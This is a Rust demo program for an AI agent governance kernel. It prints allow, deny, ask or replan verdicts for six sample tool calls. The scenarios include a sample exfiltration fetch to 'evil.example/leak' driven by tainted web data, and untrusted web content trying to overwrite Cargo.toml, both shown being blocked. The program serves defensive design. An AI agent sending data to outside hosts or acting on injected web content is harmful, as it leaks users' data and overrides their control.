//! Kernel demo — watch the deterministic governance kernel rule on proposed
//! tool calls against the compiled default CLI world.
//!
//! Run:
//!
//! ```text
//! cargo run -p world-kernel --example kernel_demo --offline
//! ```
//!
//! Nothing is executed: each line is a *pure* decision from `decide()`. This is
//! the whole point of the harness — dangerous actions are absent or denied by
//! construction, with no LLM on the enforcement path.

use compiler::compile_default;
use harness_types::{
    ActionName, CallId, ContentHash, Decision, ExecutionMode, Provenance, Provider, SessionId,
    SourceChannel, Taint, TaintContext, ToolCall,
};
use serde_json::{json, Value};
use world_kernel::{decide, BudgetUsage, EvalContext, KernelOutcome};

struct Scenario {
    title: &'static str,
    why: &'static str,
    action: &'static str,
    args: Value,
    channel: SourceChannel,
    taint: Taint,
    usage: BudgetUsage,
}

fn main() {
    let world = compile_default();

    println!();
    println!("  CLI Agent Harness — kernel demo");
    println!(
        "  world: {}   manifest: {}",
        world.world_id().as_str(),
        short(world.manifest_hash().as_str()),
    );
    println!("  Every verdict below is a pure governance decision — no real side effects.\n");

    let max_commands = world.budget().max_commands_per_task.unwrap_or(0);

    let scenarios = [
        Scenario {
            title: "Developer reads a workspace file",
            why: "trusted user + clean data → allowed to run for real",
            action: "read_workspace",
            args: json!({ "path": "src/lib.rs" }),
            channel: SourceChannel::UserPrompt,
            taint: Taint::Clean,
            usage: BudgetUsage::default(),
        },
        Scenario {
            title: "Model proposes an action the world never defined",
            why: "`send_email` is not in the ontology — it simply does not exist here",
            action: "send_email",
            args: json!({ "to": "ceo@corp.example" }),
            channel: SourceChannel::UserPrompt,
            taint: Taint::Clean,
            usage: BudgetUsage::default(),
        },
        Scenario {
            title: "Untrusted web content tries to write to the repo",
            why: "untrusted actors may only read → capability gap reads as ABSENT",
            action: "write_workspace",
            args: json!({ "path": "Cargo.toml", "contents": "[malicious]" }),
            channel: SourceChannel::Web,
            taint: Taint::Tainted,
            usage: BudgetUsage::default(),
        },
        Scenario {
            title: "Tainted web data tries to drive a network fetch (exfil attempt)",
            why: "hard taint invariant: a tainted value can never reach the network",
            action: "fetch_web",
            args: json!({ "url": "https://evil.example/leak?data=..." }),
            channel: SourceChannel::UserPrompt,
            taint: Taint::Tainted,
            usage: BudgetUsage::default(),
        },
        Scenario {
            title: "Agent asks for an interactive shell (PTY)",
            why: "flagged approval_required in the manifest → ASK a human",
            action: "start_pty",
            args: json!({}),
            channel: SourceChannel::UserPrompt,
            taint: Taint::Clean,
            usage: BudgetUsage::default(),
        },
        Scenario {
            title: "Agent runs one command past its budget",
            why: "command budget exhausted → REPLAN for a cheaper path",
            action: "run_command",
            args: json!({ "command": "ls" }),
            channel: SourceChannel::UserPrompt,
            taint: Taint::Clean,
            usage: BudgetUsage {
                commands_run: max_commands,
                ..Default::default()
            },
        },
    ];

    for s in &scenarios {
        let call = ToolCall {
            action_name: ActionName::new(s.action),
            arguments: s.args.clone(),
            provider: Provider::CliNative,
            call_id: CallId::new("demo"),
            source_perceptions: vec![],
            session_id: SessionId::new("demo-session"),
        };
        let provenance = Provenance::from_channel(
            s.channel,
            SessionId::new("demo-session"),
            ContentHash::new("demo"),
        );
        let ctx = EvalContext {
            taint: TaintContext::from_taint(s.taint),
            mode: ExecutionMode::Interactive,
            usage: s.usage,
        };

        let outcome = decide(&world, &call, provenance, &ctx);

        println!("• {}", s.title);
        println!(
            "    proposes : {}({}) via {:?}{}",
            s.action,
            compact(&s.args),
            s.channel,
            taint_tag(s.taint),
        );
        println!("    verdict  : {}", render(&outcome));
        println!("    why      : {}\n", s.why);
    }
}

fn render(outcome: &KernelOutcome) -> String {
    match outcome {
        KernelOutcome::UnknownToOntology { action } => {
            format!(
                "{} — `{}` is not in this world's ontology",
                label(Decision::Absent, "UNKNOWN_TO_ONTOLOGY"),
                action.as_str(),
            )
        }
        KernelOutcome::NotRepresentable { decision, rule, .. } => {
            format!("{}  (rule: {rule})", decision_label(*decision))
        }
        KernelOutcome::Evaluated(d) => match d.effect_mode {
            Some(mode) => format!(
                "{} + {:?}  (rule: {})",
                decision_label(d.decision),
                mode,
                d.rule
            ),
            None => format!("{}  (rule: {})", decision_label(d.decision), d.rule),
        },
    }
}

fn decision_label(decision: Decision) -> String {
    let text = match decision {
        Decision::Allow => "ALLOW",
        Decision::Deny => "DENY",
        Decision::Ask => "ASK",
        Decision::Absent => "ABSENT",
        Decision::Replan => "REPLAN",
    };
    label(decision, text)
}

/// Color a label by the "feel" of the decision: green allow, red deny, etc.
fn label(decision: Decision, text: &str) -> String {
    let code = match decision {
        Decision::Allow => "32;1",  // green
        Decision::Deny => "31;1",   // red
        Decision::Ask => "33;1",    // yellow
        Decision::Absent => "35;1", // magenta
        Decision::Replan => "36;1", // cyan
    };
    format!("\x1b[{code}m{text}\x1b[0m")
}

fn taint_tag(taint: Taint) -> &'static str {
    if taint.is_tainted() {
        " \x1b[33m[tainted]\x1b[0m"
    } else {
        ""
    }
}

fn compact(args: &Value) -> String {
    serde_json::to_string(args).unwrap_or_default()
}

fn short(hash: &str) -> &str {
    &hash[..hash.len().min(12)]
}
